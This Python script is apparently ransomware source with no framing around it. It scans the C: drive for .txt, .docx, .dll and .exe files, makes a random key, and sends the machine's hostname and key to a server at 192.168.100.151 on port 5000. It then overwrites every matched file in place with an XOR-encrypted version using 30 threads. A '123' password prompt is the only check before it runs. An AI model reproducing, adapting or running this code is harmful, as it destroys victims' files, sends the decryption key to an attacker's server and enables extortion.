import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue

# Safeguard password
safeguard = input("Enter a safeguard: ")
if safeguard != "123":
    print("Wrong safeguard!")
    exit()

# File extensions to encrypt
encrypted_ext = ('.txt', '.docx', '.dll', '.exe')

# Grab all file from the machine
file_paths = []
for root, dirs, files in os.walk('C:\\'):
    for file in files:
        file_path, file_ext = os.path.splitext(os.path.join(root, file))
        if file_ext in encrypted_ext:
            file_paths.append(os.path.join(root, file))

# Generate a random key
key = ''
encryption_level = 128 // 8
char_pool = ''

for i in range(0x00, 0xFF):
    char_pool += chr(i)

for i in range(encryption_level):
    key += random.choice(char_pool)

hostname = os.getenv('COMPUTERNAME')

# Connect to the server and send hostname and key
ip_adress = '192.168.100.151'
port = 5000
time = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((ip_adress, port))
    s.send(f"{hostname} - {key} - {time}".encode('utf-8'))

# Encrypt files
def encrypt():
    while True:
        file_path = q.get()
        with open(file_path, 'rb') as f:
            content = f.read()
            encrypted_content = bytes([content[i] ^ ord(key[i % len(key)]) for i in range(len(content))])

        with open(file_path, 'wb') as f:
            f.write(encrypted_content)
        q.task_done()

q = Queue()
for file_path in file_paths:
    q.put(file_path)

for i in range(30):
    t = Thread(target=encrypt)
    t.daemon = True
    t.start()

q.join()